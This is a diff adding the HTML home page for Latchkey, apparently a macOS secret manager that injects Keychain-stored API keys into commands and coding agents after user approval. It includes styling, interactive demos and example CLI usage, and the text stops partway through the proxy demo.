@@ -1,0 +1,751 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>Latchkey: API keys for commands and coding agents on your Mac</title>
+  <meta name="description" content="Latchkey keeps API keys and database URLs in iCloud Keychain and fills them into a command when it starts, after you approve on your Mac. For developers who run coding agents.">
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="Latchkey">
+  <meta property="og:title" content="Latchkey: API keys for commands and coding agents on your Mac">
+  <meta property="og:description" content="Keys stay in iCloud Keychain. Commands get them when they start, after you approve. Agents get only what you allow.">
+  <meta name="twitter:card" content="summary">
+  <meta name="color-scheme" content="light dark">
+  <meta name="theme-color" content="#f7f8fa" media="(prefers-color-scheme: light)">
+  <meta name="theme-color" content="#0d1014" media="(prefers-color-scheme: dark)">
+  <link rel="icon" href="logo.svg" type="image/svg+xml">
+  <link rel="apple-touch-icon" href="apple-touch-icon.png">
+  <link rel="stylesheet" href="site.css">
+  <script>document.documentElement.classList.add("js")</script>
+  <link rel="alternate" type="text/plain" title="Latchkey, summarized for language models" href="llms.txt">
+  <style>
+    /* Home page. One column that follows the shop project from env file to rotation; the only drawn surfaces are the
+       product's own: a terminal and the approval panel. */
+    main.home { max-width: 760px; }
+    .home h2 { font-size: clamp(24px, 3.2vw, 30px); margin-top: 72px; }
+    .home > p, .home li { max-width: 66ch; }
+    .lede { font-size: 20px; color: var(--muted); }
+    .hero { padding-top: 56px; }
+    .hero h1 { max-width: 18ch; }
+    .cta { display: flex; flex-wrap: wrap; align-items: center; gap: 12px 20px; margin: 24px 0 8px; }
+    .fine { font-size: 14px; color: var(--muted); }
+
+    /* The terminal and, over it, the approval panel as the app draws it. */
+    .stage { position: relative; margin: 40px 0 0; padding-bottom: 240px; }
+    .term { border-radius: 10px; background: #0f1318; color: #d7dee7; border: 1px solid #222a33; overflow: hidden; }
+    .term .bar { display: flex; gap: 7px; padding: 10px 12px; background: #171c22; border-bottom: 1px solid #222a33; }
+    .term .bar i { width: 11px; height: 11px; border-radius: 50%; background: #3a424c; display: block; }
+    .term pre { margin: 0; padding: 14px 16px 18px; font: 500 13.5px/1.7 var(--mono); white-space: pre-wrap; overflow-wrap: anywhere; }
+    .term .p { color: #8ec5ff; }
+    .term .d { color: #8b95a1; }
+    .term .c { color: #ffcf6b; }
+    .panel { position: absolute; right: -12px; bottom: 0; width: min(430px, 94%); padding: 18px 18px 14px; border-radius: 12px;
+             background: var(--surface); border: 1px solid var(--line); box-shadow: var(--shadow); font-size: 14px; }
+    .panel .head { display: flex; gap: 12px; align-items: center; margin-bottom: 12px; }
+    .panel .head .mark { width: 40px; height: 40px; border-radius: 10px; }
+    .panel .head .mark img { width: 25px; height: 25px; }
+    .panel .head b { display: block; font: 700 16px/1.2 var(--display); }
+    .panel .head span { color: var(--muted); font-size: 13px; }
+    .panel dl { display: grid; grid-template-columns: auto 1fr; gap: 4px 12px; margin: 0 0 12px; }
+    .panel dt { color: var(--muted); text-align: right; }
+    .panel dd { margin: 0; font: 500 12.5px/1.6 var(--mono); overflow-wrap: anywhere; }
+    .panel .grant { padding: 9px 10px; border-radius: 8px; background: var(--bg-2); margin-bottom: 12px; color: var(--muted); font-size: 13px; }
+    .panel .grant div { display: flex; flex-wrap: wrap; align-items: center; gap: 6px; }
+    .panel .grant div + div { margin-top: 6px; }
+    .panel .chip { padding: 2px 8px; border-radius: 6px; background: var(--surface); border: 1px solid var(--line); color: var(--ink); }
+    .panel .box { width: 12px; height: 12px; border: 1px solid var(--muted); border-radius: 3px; display: inline-block; }
+    .panel .row { display: flex; align-items: center; gap: 8px; }
+    .panel .row small { margin-right: auto; color: var(--muted); font-size: 12px; }
+    .panel .btn { white-space: nowrap; padding: 5px 12px; border-radius: 7px; border: 1px solid var(--line); background: var(--surface); font-weight: 600; font-size: 13px; }
+    .panel .btn.go { background: var(--accent); color: var(--accent-ink); border-color: transparent; }
+
+    .pair { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    .pair figure.code { margin: 0; }
+    .pair figure.code pre code { white-space: pre-wrap; overflow-wrap: anywhere; }
+    dl.facts { display: grid; grid-template-columns: max-content 1fr; gap: 10px 20px; margin: 20px 0; }
+    dl.facts dt { font-weight: 650; }
+    dl.facts dd { margin: 0; color: var(--muted); }
+    .limits { padding-left: 20px; }
+    .limits li { margin: 8px 0; }
+    ol.install { padding-left: 22px; }
+    ol.install li { margin: 8px 0; }
+    .placeholder { border: 1px dashed var(--warn); border-radius: 8px; padding: 10px 14px; font-size: 15px; color: var(--muted); }
+
+    /* Scenes: shown when scripts run; the static figures above them stand in otherwise. */
+    .scene, .demo-foot button { display: none; }
+    .js .scene { display: block; }
+    .js .static-only { display: none; }
+    .js .demo-foot button:not([hidden]) { display: inline-flex; }
+    .button.small { min-height: 32px; padding: 0 12px; font-size: 14px; }
+    .term .bar .tt { margin-left: 8px; font: 500 12px/11px var(--sans); color: #8b95a1; }
+    /* A fixed-height terminal that keeps its last line in view, with room below it for the panel's overlap. */
+    #demo-out { height: 290px; overflow-y: auto; padding-bottom: 70px; }
+    .caret { display: inline-block; width: 8px; height: 15px; vertical-align: -2px; background: #d7dee7; animation: blink 1s steps(1) infinite; }
+    @keyframes blink { 50% { opacity: 0; } }
+    .panel { transition: opacity .18s ease, transform .18s ease, visibility .18s; }
+    .js .panel:not(.on) { opacity: 0; transform: translateY(8px) scale(.98); visibility: hidden; }
+    .panel button.btn { font: 600 13px/1.2 var(--sans); color: var(--ink); cursor: pointer; }
+    .panel button.btn.go { color: var(--accent-ink); }
+    .panel button:disabled { cursor: default; }
+    .panel button:not(:disabled):hover { filter: brightness(1.06); }
+    .panel label { display: flex; align-items: center; gap: 6px; margin-top: 6px; color: var(--ink); }
+    /* Beside the panel, in the space it hangs into. */
+    .demo-foot { position: absolute; left: 0; bottom: 0; width: calc(100% - min(430px, 94%) - 8px); display: flex; flex-direction: column;
+                 align-items: flex-start; gap: 10px; padding-bottom: 8px; }
+    .demo-foot p { margin: 0; font-size: 15px; }
+    .js .demo-foot { min-height: 0; }
+    .term .err { color: #ff9b8f; }
+    /* The menu bar, with Latchkey's icon and its panel of recent activity. */
+    .menubar { position: relative; display: flex; justify-content: flex-end; align-items: center; height: 30px; margin-bottom: 10px;
+               padding: 0 10px; border-radius: 8px; background: #1b2028; border: 1px solid #262e38; }
+    .mb-icon { display: grid; place-items: center; width: 34px; height: 24px; border: 0; border-radius: 6px; background: none; cursor: pointer; }
+    .mb-icon img { width: 20px; height: 17px; filter: brightness(0) invert(1); opacity: .92; }
+    .mb-icon[aria-expanded="true"], .mb-icon:hover { background: rgba(255, 255, 255, .14); }
+    .mb-icon.flash { animation: flash 1.2s ease; }
+    @keyframes flash { 0%, 60% { background: rgba(78, 161, 255, .55); } 100% { background: none; } }
+    .mb-menu { position: absolute; z-index: 5; top: 34px; right: 4px; width: min(340px, 92vw); padding: 10px; border-radius: 12px;
+               background: rgba(36, 40, 47, .97); border: 1px solid #3a414b; box-shadow: 0 16px 40px rgba(0, 0, 0, .5); color: #e8ecf1; font-size: 13px; }
+    .mb-head { margin: 2px 4px 8px; font-weight: 700; font-size: 14px; }
+    .mb-menu ul { list-style: none; margin: 0; padding: 6px 0; border-top: 1px solid #3a414b; border-bottom: 1px solid #3a414b; }
+    .mb-menu li { padding: 6px 4px; }
+    .mb-menu li b { display: block; font-weight: 650; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .mb-menu li span { color: #aab3bf; font-size: 12px; }
+    .mb-menu li.no b::before { content: "\25CF  "; color: #ff6b5e; }
+    .mb-menu li.yes b::before { content: "\25CF  "; color: #4cd07d; }
+    .mb-menu .mb-empty { color: #aab3bf; }
+    .mb-foot { display: flex; justify-content: space-between; margin: 8px 4px 0; color: #aab3bf; }
+    .mb-foot a { color: #e8ecf1; }
+    /* The system's Touch ID sheet, with Latchkey's own words. */
+    .touch { position: absolute; z-index: 4; left: 50%; top: 60px; transform: translateX(-50%); width: min(300px, 92%); padding: 18px;
+             border-radius: 16px; background: rgba(40, 44, 52, .98); border: 1px solid #3a414b; box-shadow: 0 20px 50px rgba(0, 0, 0, .55);
+             color: #f1f3f6; text-align: left; }
+    .touch-icon { position: relative; width: 56px; height: 56px; border-radius: 50%; background: #e9ebef; color: #9aa1ab; display: grid; place-items: center; margin-bottom: 10px; }
+    .touch-icon svg { width: 34px; height: 34px; }
+    .touch-icon img { position: absolute; right: -8px; bottom: -4px; width: 20px; height: 17px; padding: 4px; border-radius: 7px; background: #f6f7f9; box-sizing: content-box; }
+    .touch.reading .touch-icon { color: #ff3b30; animation: read 1.2s ease-in-out infinite; }
+    .touch.ok .touch-icon { color: #34c759; }
+    @keyframes read { 50% { color: #ff8a80; } }
+    .touch-text { margin: 0 0 6px; font-weight: 700; font-size: 13.5px; line-height: 1.35; }
+    .touch-sub { margin: 0 0 12px; font-size: 13px; color: #c9ced6; }
+    .touch-btn { display: block; width: 100%; margin-top: 8px; padding: 7px; border-radius: 9px; border: 0; background: #4a505a; color: #fff; font: 600 13px var(--sans); cursor: pointer; }
+    .touch-btn:hover { background: #575e69; }
+    @media (prefers-reduced-motion: reduce) { .mb-icon.flash, .touch.reading .touch-icon { animation: none; } }
+    .term .t-act { color: #8ec5ff; } .term .t-flag { color: #d4b3ff; } .term .t-val { color: #a5e3b5; }
+    .term .t-sep { color: #8b95a1; } .term .t-child { color: #d7dee7; }
+    /* The completion list under the command as it's typed, the way an editor suggests. */
+    .term { position: relative; }
+    .complete { position: absolute; z-index: 2; min-width: 260px; max-width: 360px; margin: 0; padding: 4px; list-style: none;
+                background: #1c232c; border: 1px solid #2c3540; border-radius: 8px; box-shadow: 0 8px 24px rgba(0, 0, 0, .45);
+                font: 500 12.5px/1.45 var(--mono); }
+    .complete li { display: grid; grid-template-columns: max-content 1fr; gap: 10px; padding: 3px 8px; border-radius: 5px; color: #d7dee7; }
+    .complete li.sel { background: #2b4a73; }
+    .complete li b { font-weight: 600; color: #d4b3ff; }
+    .complete li b.a { color: #8ec5ff; }
+    .complete li span { color: #a3adb9; font-family: var(--sans); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .complete li.sel span { color: #d0d7e0; }
+    .term .note { color: #8ec5ff; }
+
+    .envfile .v { transition: background-color .5s ease, color .5s ease; border-radius: 3px; }
+    .envfile .v.swapped { background: color-mix(in srgb, var(--accent) 22%, transparent); }
+    .envfile figcaption .button { margin-left: auto; }
+
+    .proxy .lanes { display: grid; grid-template-columns: 1fr 90px 1fr; align-items: stretch; gap: 0; margin: 20px 0 12px; }
+    .proxy .lane { border: 1px solid var(--line); border-radius: 10px; background: var(--code-bg); padding: 10px 12px; min-width: 0; }
+    .proxy .lane pre { margin: 0; font: 500 13px/1.6 var(--mono); white-space: pre-wrap; overflow-wrap: anywhere; color: var(--code-ink); }
+    .proxy .label { margin: 0 0 6px; font-size: 13px; color: var(--muted); }
+    .proxy .wire { position: relative; display: grid; place-items: center; }
+    .proxy .wire::before { content: ""; position: absolute; left: 0; right: 0; top: 50%; border-top: 1px dashed var(--line); }
+    .proxy .hop { position: relative; font: 600 11px var(--mono); color: var(--muted); background: var(--bg); padding: 2px 6px; border: 1px solid var(--line); border-radius: 6px; }
+    .proxy .packet { position: absolute; left: 0; top: calc(50% - 5px); width: 10px; height: 10px; border-radius: 50%; background: var(--accent); opacity: 0; }
+    .proxy .packet.go { animation: hop .9s ease-in-out forwards; }
+    @keyframes hop { 0% { left: 0; opacity: 1; } 100% { left: calc(100% - 10px); opacity: 1; } }
+    .proxy #proxy-auth.real { color: var(--ok); }
+    .proxy #proxy-auth.bad, .proxy #proxy-host.bad { color: var(--warn); }
+    .proxy .actions { display: flex; flex-wrap: wrap; gap: 8px; }
+    .term.mini pre { min-height: 64px; padding: 10px 14px; font-size: 13px; }
+    .term.mini { margin-top: 12px; }
+
+    /* The Latchkey window: wider than the reading column, three panes like the app. */
+    .appwrap { position: relative; left: 50%; transform: translateX(-50%); width: min(1100px, calc(100vw - 32px)); margin: 24px 0 10px; }
+    .appwin { position: relative; border-radius: 12px; border: 1px solid var(--line); background: var(--surface); box-shadow: var(--shadow); overflow: hidden;
+              font-size: 13.5px; color: var(--ink); }
+    .appwin .chrome { display: flex; align-items: center; gap: 7px; height: 36px; padding: 0 12px; border-bottom: 1px solid var(--line); background: var(--bg-2); }
+    .appwin .chrome i { width: 11px; height: 11px; border-radius: 50%; background: #ff5f57; display: block; }
+    .appwin .chrome i:nth-child(2) { background: #febc2e; } .appwin .chrome i:nth-child(3) { background: #28c840; }
+    .appwin .chrome span { margin-left: 8px; font-weight: 600; color: var(--muted); }
+    .appwin .body { display: grid; grid-template-columns: 210px 290px 1fr; height: 560px; }
+    .appwin .side, .appwin .list, .appwin .detail { overflow-y: auto; padding: 12px; min-width: 0; }
+    .appwin .side { background: var(--bg-2); border-right: 1px solid var(--line); }
+    .appwin .list { border-right: 1px solid var(--line); }
+    .appwin .list.wide { grid-column: span 2; border-right: 0; }
+    .appwin button { font: inherit; color: inherit; background: none; border: 0; cursor: pointer; text-align: left; }
+    .appwin .tiles { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 14px; }
+    .appwin .tile { position: relative; padding: 8px 9px; border-radius: 10px; background: var(--surface); border: 1px solid var(--line); font-weight: 650; font-size: 12.5px; line-height: 1.2; min-height: 54px; display: flex; align-items: flex-end; }
+    .appwin .tile .tn { position: absolute; top: 6px; right: 9px; font-size: 13px; }
+    .appwin .tile[aria-pressed="true"] { background: var(--accent); color: var(--accent-ink); border-color: transparent; }
+    .appwin .sh { margin: 12px 4px 4px; font-size: 11.5px; font-weight: 650; color: var(--muted); }
+    .appwin .side ul { list-style: none; margin: 0; padding: 0; }
+    .appwin .side li button { display: flex; align-items: center; gap: 8px; width: 100%; padding: 5px 6px; border-radius: 7px; }
+    .appwin .side li button span:not(.ki) { flex: 1; }
+    .appwin .side li button em { font-style: normal; color: var(--muted); }
+    .appwin .side li button[aria-pressed="true"], .appwin .side li button:hover { background: var(--surface); }
+    .appwin .sync { margin: 16px 0 0; padding: 10px; border-radius: 10px; background: var(--surface); border: 1px solid var(--line); color: var(--muted); font-size: 12px; }
+    .appwin .sync b { display: block; color: var(--ink); font-size: 13px; }
+    .appwin .lt { margin: 0 4px 10px; font-weight: 700; font-size: 15px; }
+    .appwin .lt small { display: block; font-weight: 400; font-size: 12px; color: var(--muted); }
+    .appwin .grp { display: flex; align-items: center; gap: 7px; width: 100%; padding: 7px 4px; border-bottom: 1px solid var(--line); flex-wrap: wrap; }
+    .appwin .grp b { font-weight: 650; }
+    .appwin .grp em { font-style: normal; color: var(--muted); margin-right: auto; }
+    .appwin .grp.sub { padding-left: 18px; }
+    .appwin .chev { width: 8px; height: 8px; border-right: 1.6px solid var(--muted); border-bottom: 1.6px solid var(--muted); transform: rotate(-45deg); margin-right: 2px; transition: transform .15s; }
+    .appwin .grp[aria-expanded="true"] .chev { transform: rotate(45deg); }
+    .appwin .place { color: var(--muted); font-size: 12px; }
+    .appwin .env { padding: 1px 7px; border-radius: 6px; font-size: 11.5px; font-weight: 600; background: color-mix(in srgb, var(--accent) 16%, transparent); color: var(--t-act); }
+    .appwin .env-preview { background: color-mix(in srgb, var(--t-flag) 18%, transparent); color: var(--t-flag); }
+    .appwin .env-production { background: rgba(225, 70, 60, .14); color: #a8291f; }
+    @media (prefers-color-scheme: dark) { :root:not([data-theme="light"]) .appwin .env-production { color: #ff8a80; } }
+    :root[data-theme="dark"] .appwin .env-production { color: #ff8a80; }
+    .appwin .item { display: flex; align-items: center; gap: 10px; width: 100%; padding: 7px 8px 7px 30px; border-radius: 8px; }
+    .appwin .item span { min-width: 0; }
+    .appwin .item b { display: block; font-weight: 600; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .appwin .item small { color: var(--muted); font-size: 12px; }
+    .appwin .item[aria-pressed="true"] { background: var(--accent); color: var(--accent-ink); }
+    .appwin .item[aria-pressed="true"] small { color: inherit; opacity: .85; }
+    .appwin .item:not([aria-pressed="true"]):hover { background: var(--bg-2); }
+    .appwin .ki { width: 26px; height: 26px; border-radius: 7px; display: grid; place-items: center; flex: none; color: #fff; }
+    .appwin .ki svg { width: 14px; height: 14px; fill: currentColor; }
+    .appwin .ki-token { background: #1f7cf0; } .appwin .ki-password { background: #f2994a; } .appwin .ki-key { background: #c94fd8; } .appwin .ki-value { background: #8a929c; }
+    .appwin .ki-proj, .appwin .ki-svc, .appwin .ki-grant, .appwin .ki-del, .appwin .ki-shared { width: 18px; height: 18px; border-radius: 5px; background: var(--line); }
+    .appwin .ki-grant { background: #2bb3c0; } .appwin .ki-proj { background: #6b7cf5; }
+    .appwin .side .ki:not(.ki-proj):not(.ki-svc):not(.ki-grant):not(.ki-del) { width: 20px; height: 20px; border-radius: 6px; }
+    .appwin .side .ki svg { width: 11px; height: 11px; }
+    .appwin .ki.big { width: 52px; height: 52px; border-radius: 13px; }
+    .appwin .ki.big svg { width: 26px; height: 26px; }
+    .appwin .card { padding: 10px 12px; border-radius: 10px; background: var(--bg-2); margin-bottom: 10px; }
+    .appwin .card.head { display: flex; gap: 12px; align-items: center; }
+    .appwin .dn { display: block; font-size: 18px; font-weight: 700; }
+    .appwin .kv { display: flex; align-items: center; gap: 10px; padding: 7px 0; border-bottom: 1px solid var(--line); }
+    .appwin .kv:last-child { border-bottom: 0; }
+    .appwin .kv > span { flex: 1; font-weight: 550; }
+    .appwin .kv small { display: block; font-weight: 400; color: var(--muted); font-size: 12px; }
+    .appwin .kv em { font-style: normal; color: var(--muted); }
+    .appwin .kv code { font-size: 12px; overflow-wrap: anywhere; background: none; border: 0; }
+    .appwin .ib { padding: 3px 9px; border-radius: 6px; border: 1px solid var(--line); background: var(--surface); font-size: 12px; font-weight: 600; }
+    .appwin .switch { width: 38px; height: 22px; border-radius: 11px; background: var(--line); position: relative; flex: none; }
+    .appwin .switch i { position: absolute; top: 2px; left: 2px; width: 18px; height: 18px; border-radius: 50%; background: #fff; transition: left .15s; box-shadow: 0 1px 2px rgba(0,0,0,.3); }
+    .appwin .switch[aria-checked="true"] { background: #34c759; }
+    .appwin .switch[aria-checked="true"] i { left: 18px; }
+    .appwin .dh { margin: 14px 2px 6px; font-weight: 700; }
+    .appwin .fn { margin: -4px 4px 10px; font-size: 12px; color: var(--muted); }
+    .appwin .muted { margin: 0; color: var(--muted); }
+    .appwin .empty { color: var(--muted); padding: 8px 4px; }
+    .appwin .entry { display: flex; gap: 10px; padding: 8px 4px; border-bottom: 1px solid var(--line); }
+    .appwin .entry div { flex: 1; min-width: 0; }
+    .appwin .entry b { display: block; font-weight: 650; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .appwin .entry span { display: block; color: var(--muted); font-size: 12px; }
+    .appwin .entry .mono { font-family: var(--mono); }
+    .appwin .entry time { color: var(--muted); font-size: 12px; white-space: nowrap; }
+    .appwin .dot { width: 10px; height: 10px; border-radius: 50%; margin-top: 4px; flex: none; background: #34c759; }
+    .appwin .dot.no { background: #ff3b30; }
+    .appwin .grantrow { display: flex; align-items: center; gap: 12px; padding: 10px 4px; border-bottom: 1px solid var(--line); }
+    .appwin .grantrow div { flex: 1; }
+    .appwin .grantrow b { display: block; font-family: var(--mono); font-size: 13px; }
+    .appwin .grantrow span { display: block; color: var(--muted); font-size: 12px; }
+    .appwin .pill { padding: 5px 12px; border-radius: 7px; border: 1px solid var(--line); background: var(--surface); font-weight: 600; }
+    .appwin button:focus-visible { outline: 2px solid var(--accent); outline-offset: 1px; }
+    .appwin .touch { top: 90px; }
+
+    @media (max-width: 860px) {
+      .appwin .body { grid-template-columns: 1fr; height: auto; }
+      .appwin .side { border-right: 0; border-bottom: 1px solid var(--line); max-height: none; }
+      .appwin .side ul, .appwin .side .sh, .appwin .sync { display: none; }
+      .appwin .tiles { grid-template-columns: repeat(4, 1fr); margin: 0; }
+      .appwin .list { border-right: 0; border-bottom: 1px solid var(--line); max-height: 380px; }
+      .appwin .list.wide { grid-column: auto; }
+      .appwin .detail { max-height: 520px; }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      .appwin .chev, .appwin .switch i { transition: none; }
+      .panel, .envfile .v { transition: none; }
+      .caret { animation: none; }
+      .proxy .packet.go { animation: none; left: calc(100% - 10px); opacity: 1; }
+    }
+
+    @media (max-width: 640px) {
+      .proxy .lanes { grid-template-columns: 1fr; gap: 0; }
+      .proxy .wire { height: 36px; }
+      .proxy .wire::before { left: 50%; right: auto; top: 0; bottom: 0; border-top: 0; border-left: 1px dashed var(--line); }
+      .proxy .packet.go { animation: none; opacity: 0; }
+      .stage { padding-bottom: 0; }
+      #demo-out { height: 260px; padding-bottom: 18px; }
+      .demo-foot { position: static; width: auto; margin-top: 12px; }
+      .js .panel:not(.on) { display: none; }
+      .panel { position: relative; right: auto; width: 100%; margin-top: -20px; }
+      .pair { grid-template-columns: 1fr; }
+      dl.facts { grid-template-columns: 1fr; gap: 2px; }
+      dl.facts dd { margin-bottom: 10px; }
+      .lede { font-size: 18px; }
+    }
+  </style>
+</head>
+<body>
+  <a class="skip" href="#main">Skip to content</a>
+  <header class="site">
+    <nav class="top wrap" aria-label="Main">
+      <a class="brand" href="index.html"><img class="logo" src="logo.svg" alt="">Latchkey</a>
+      <ul>
+        <li><a href="developers/index.html">Docs</a></li>
+        <li><a class="button primary" href="#install">Preview status</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main id="main" class="wrap home">
+    <section class="hero" aria-labelledby="title">
+      <h1 id="title">API keys for commands and coding agents on your Mac</h1>
+      <p class="lede">Latchkey keeps API keys and database URLs in iCloud Keychain. When a command starts, it fills them in, after you approve with Touch ID or under a limit you set ahead of time. Your project files keep only references.</p>
+      <div class="cta">
+        <a class="button primary" href="#install">Development preview</a>
+        <a href="developers/quickstart.html">Quickstart for the command line</a>
+      </div>
+      <p class="fine">macOS 15 or later. The app and the <code>lk</code> command-line tool. No account or server.</p>
+
+      <div class="stage" id="demo">
+        <div class="menubar">
+          <button class="mb-icon" id="mb-icon" type="button" aria-expanded="false" aria-controls="mb-menu" aria-label="Latchkey in the menu bar">
+            <img src="logo.svg" alt="">
+          </button>
+          <div class="mb-menu" id="mb-menu" hidden>
+            <p class="mb-head">iCloud Keychain</p>
+            <ul id="mb-activity"><li class="mb-empty">No activity yet.</li></ul>
+            <p class="mb-foot"><a href="#app">Open Latchkey</a><span>Settings… &nbsp; Quit</span></p>
+          </div>
+        </div>
+        <div class="term">
+          <div class="bar"><i></i><i></i><i></i><span class="tt">claude in ~/Projects/shop</span></div>
+<pre id="demo-out" aria-hidden="true"><span class="p">~/Projects/shop $</span> lk run --env shop/development -- npm test
+<span class="d">&gt; shop@1.0.0 test</span>
+<span class="d">&gt; vitest run</span>
+
+ ✓ db/connect.test.ts (3 tests)
+   connecting to <span class="c">&lt;concealed by latchkey&gt;</span>
+ ✓ billing/charge.test.ts (5 tests)
+
+ Test Files  2 passed (2)</pre>
+        </div>
+        <div class="panel on" id="demo-panel" role="group" aria-label="Latchkey's approval panel">
+          <div class="head"><span class="mark"><img src="logo.svg" alt=""></span><div><b>Release 2 items?</b><span>Latchkey</span></div></div>
+          <dl>
+            <dt>Items</dt><dd>DATABASE_URL, STRIPE_KEY</dd>
+            <dt>Asked by</dt><dd>zsh › claude › Terminal</dd>
+            <dt>Folder</dt><dd>~/Projects/shop</dd>
+            <dt>Command</dt><dd id="demo-cmd">lk run --env shop/development -- npm test</dd>
+          </dl>
+          <div class="grant">
+            <div>Allow from this folder <span class="chip">until claude quits</span> <button class="btn" type="button" data-choice="grant" disabled>Allow</button></div>
+            <label><input type="checkbox" id="demo-only" disabled> Only for <span id="demo-only-cmd">npm test</span></label>
+          </div>
+          <div class="row"><small>Touch ID confirms your choice.</small><button class="btn" type="button" data-choice="deny" disabled>Deny</button><button class="btn go" type="button" data-choice="once" disabled>Allow Once</button></div>
+        </div>
+        <div class="touch" id="touch" role="dialog" aria-label="Touch ID" hidden>
+          <div class="touch-icon"><svg viewBox="0 0 48 48" aria-hidden="true"><g fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M14 30c0-7 4-12 10-12s10 5 10 12"/><path d="M18 34c0-6 2-10 6-10s6 4 6 10"/><path d="M24 30v8"/><path d="M10 26c1-9 7-15 14-15s13 6 14 15"/><path d="M12 16c3-4 7-6 12-6s9 2 12 6"/></g></svg><img src="logo.svg" alt=""></div>
+          <p class="touch-text" id="touch-text"></p>
+          <p class="touch-sub">Touch ID or enter your password to continue with Latchkey.</p>
+          <button type="button" class="touch-btn" data-t="pw">Use Password…</button>
+          <button type="button" class="touch-btn" data-t="deny">Deny</button>
+        </div>
+        <div class="demo-foot">
+          <p id="demo-status" class="fine" aria-live="polite">You're the person at the Mac: when the agent's command asks, choose in the panel.</p>
+          <button id="demo-restart" class="button secondary small" type="button" hidden>Start over</button>
+        </div>
+      </div>
+    </section>
+
+    <h2 id="files">Move the values out of your env files</h2>
+    <p>Point Latchkey at an env file. Each value goes into iCloud Keychain under the repository's name and the environment the file name implies, and the file keeps a reference in its place. If a file of references is committed by mistake, only the names show.</p>
+    <figure class="code"><figcaption><span>Terminal</span><button class="copy" type="button" aria-label="Copy code">Copy</button></figcaption><pre><code>lk import .env.local --rewrite</code></pre></figure>
+    <div class="pair static-only">
+      <figure class="code"><figcaption><span>.env.local before</span></figcaption><pre><code>DATABASE_URL=postgres://app:9fK2…@db.neon.tech/shop
+STRIPE_KEY=sk_live_51Hx…</code></pre></figure>
+      <figure class="code"><figcaption><span>.env.local after</span></figcaption><pre><code>DATABASE_URL=latchkey://shop/development/DATABASE_URL
+STRIPE_KEY=latchkey://shop/development/STRIPE_KEY</code></pre></figure>
+    </div>
+    <div class="scene" id="import-demo">
+      <figure class="code envfile"><figcaption><span>.env.local</span><button class="copy-like button secondary small" type="button" id="import-run">Run lk import --rewrite</button></figcaption><pre><code><span class="ln">DATABASE_URL=<span class="v" data-before="postgres://app:9fK2…@db.neon.tech/shop" data-after="latchkey://shop/development/DATABASE_URL">postgres://app:9fK2…@db.neon.tech/shop</span></span>
+<span class="ln">STRIPE_KEY=<span class="v" data-before="sk_live_51Hx…" data-after="latchkey://shop/development/STRIPE_KEY">sk_live_51Hx…</span></span></code></pre></figure>
+      <p class="fine" id="import-status" aria-live="polite">Press the button to import this file.</p>
+    </div>
+    <p>For every project at once, <code>lk import --scan ~/Projects --dry-run</code> lists each env file it found and where each value would go, before anything is sent.</p>
+
+    <h2 id="run">Run commands with the keys filled in</h2>
+    <p>Put <code>lk run</code> in front of a command. It reads the references, asks the app for the values, and starts the command with them in its environment. A value of six characters or more that the command prints shows up as <code>&lt;concealed by latchkey&gt;</code>. With <code>--env</code>, no file is needed at all, which suits a fresh git worktree that has no <code>.env</code>.</p>
+    <figure class="code"><figcaption><span>Terminal</span><button class="copy" type="button" aria-label="Copy code">Copy</button></figcaption><pre><code>lk run --env-file .env.local -- npm run dev
+lk run --env shop/development -- npm test</code></pre></figure>
+
+    <h2 id="agents">When an agent asks</h2>
+    <p>The panel in the picture above appears on your Mac whenever a key isn't already allowed. Everything it shows comes from macOS rather than from the request: the program and the programs that started it, the folder it runs in, and its full command line. A script that talks to Latchkey directly, instead of through the signed <code>lk</code> tool, is named by its path with a warning.</p>
+    <p>Allow Once releases the keys for that run. To let an agent work while you're away, allow the folder for a while, until the agent quits, or only for one command. The same limits are available ahead of time:</p>
+    <figure class="code"><figcaption><span>Run inside the agent's session</span><button class="copy" type="button" aria-label="Copy code">Copy</button></figcaption><pre><code>lk grant 'shop/development/*' --session --for 4h
+lk grant 'shop/development/*' --command "npm test" --for 2h</code></pre></figure>
+    <p>Through the MCP server, an agent can ask for a grant only on its own folder and for its own session, for a day at most, and never for production items.</p>
+
+    <h2 id="app">The app</h2>
+    <p>Everything Latchkey keeps is in one window: items grouped by project and environment, which ones agents may read without asking, where each is used, every request in Activity, and the grants in effect. The window below works with example data. Whatever you chose in the panel at the top of the page is already in its Activity, and a grant you made is under Grants, where Revoke stops future reads through that grant. Changes ask for Touch ID. Revealing a value asks unless its No Approval setting permits it.</p>
+    <div class="appwrap"><div class="appwin" id="appwin" aria-label="The Latchkey window, with example data"></div></div>
+    <p class="fine">Example data; the values are made up. The menu bar icon opens a smaller panel with search and recent activity, like the one above the terminal.</p>
+
+    <h2 id="proxy">Keys an agent can use without reading</h2>
+    <p>A command that has a key in its environment can print it, encode it or send it somewhere, and masking only catches exact copies. For OpenAI and Anthropic keys, <code>lk run --proxy</code> keeps the key out of the command. The command gets a placeholder and a base URL on your Mac; Latchkey adds the real key to requests bound for <code>api.openai.com</code> or <code>api.anthropic.com</code> and refuses unauthenticated requests. Proxy mode refuses custom base URLs and additional variable or file deliveries of the protected key. Other credentials are still delivered normally.</p>
+    <div class="scene proxy" id="proxy-demo">
+      <div class="lanes">
+        <div class="lane"><p class="label">In the command's environment</p><pre>OPENAI_API_KEY=lk-proxy-3f9c…8e4a
+OPENAI_BASE_URL=http://127.0.0.1:52817/v1</pre></div>
+        <div class="wire" aria-hidden="true"><span class="hop">lk run</span><i class="packet"></i></div>
+        <div class="lane"><p class="label">Arriving at <span id="proxy-host">api.openai.com</span></p><pre>POST /v1/chat/completions
+Authorization: Bearer <span id="proxy-auth">lk-proxy-3f9c…8e4a</span></pre></div>
+      </div>
+      <div class="actions" role="group" aria-label="Things the command can try">
+        <button class="button secondary small" type="button" data-try="call">Call the API</button>
+        <button class="button secondary small" type="button" data-try="print">Print the key</button>
+        <button class="button secondary small" type="button" data-try="encode">Encode it</button>
